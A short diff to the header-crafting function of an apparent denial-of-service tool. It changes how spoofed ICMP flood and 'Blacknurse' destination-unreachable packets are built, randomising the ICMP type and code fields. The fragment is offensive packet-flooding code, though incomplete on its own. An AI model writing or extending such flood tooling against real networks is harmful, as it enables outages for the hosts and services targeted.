@@ -71,12 +71,12 @@ ICMP_Flood::ICMP_Flood(const config *conf, Logger *logger) : Spoofed_Flood(conf,
 void ICMP_Flood::override_headers(icmphdr *icmp, iphdr *ip){
     switch (conf->vector){
         case config::ICMPFlood:
-            icmp->type = ICMP_ECHO;
-            icmp->code = static_cast<u_int8_t>(Randomizer::randomInt(1, 1000));
+            icmp->type = static_cast<u_int8_t>(Randomizer::randomInt(1, 30));
+            icmp->code = static_cast<u_int8_t>(Randomizer::randomInt(1, 15));
             break;
         case config::Blacknurse:
             icmp->type = ICMP_DEST_UNREACH;
-            icmp->code = static_cast<u_int8_t>(3);
+            icmp->code = ICMP_PORT_UNREACH;
             break;
         default:break;
     }
